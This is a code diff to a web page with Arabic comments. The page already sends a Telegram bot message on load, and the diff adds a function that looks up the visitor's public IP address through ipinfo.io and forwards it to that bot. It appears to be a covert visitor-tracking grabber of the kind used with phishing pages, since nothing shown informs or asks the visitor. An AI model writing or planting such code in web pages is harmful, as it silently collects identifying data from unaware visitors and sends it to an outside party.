@@ -120,6 +120,19 @@
       xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
       xhr.send();
     }
+    
+    function getIPAddress() {
+      // استرجاع عنوان الـ IP باستخدام API
+      fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+              var ip = data.ip;
+              sendTelegramMessage(ip); // إرسال العنوان IP إلى الدالة sendTelegramMessage()
+          })
+          .catch(error => {
+              console.error('حدث خطأ في استرجاع عنوان الـ IP:', error);
+          });
+    }
 
     window.onload = sendTelegramMessage;
 
@@ -152,6 +165,3 @@
   
   
   </body></html>
-
-
-
